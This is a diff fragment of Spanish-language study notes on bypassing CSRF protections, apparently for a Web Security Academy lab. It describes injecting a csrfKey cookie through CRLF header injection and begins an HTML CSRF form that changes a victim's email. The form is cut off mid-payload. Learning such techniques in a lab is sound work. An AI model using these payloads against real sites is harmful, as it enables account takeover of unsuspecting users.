@@ -53,6 +53,7 @@ Non-Session Cookie:
 - El ultimo bloque simplemente usa un CLRF (inyeccion de cabeceras HTTP), y con el /r/n url encodeados (%0d%0a) le inyecta al navegador de la victima nuestra csrfKey, lo cual, con el CSRF Token hidden que tiene la peticion anterior, hace que sean validos y se cambie el id de la victima.
 
 
+- Este payload se puede usar cuando con que coincidan los dos csrf, no valida mas, con esto hacemos que se haga la solicitud con X csrf y luego con el CLRF le metemos en el header ese mismo csrf:
 ```html
 <form class="login-form" name="change-email-form" action="https://0af7004c0302a40d8026807300e000d0.web-security-academy.net/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="pwned@pwned.com">
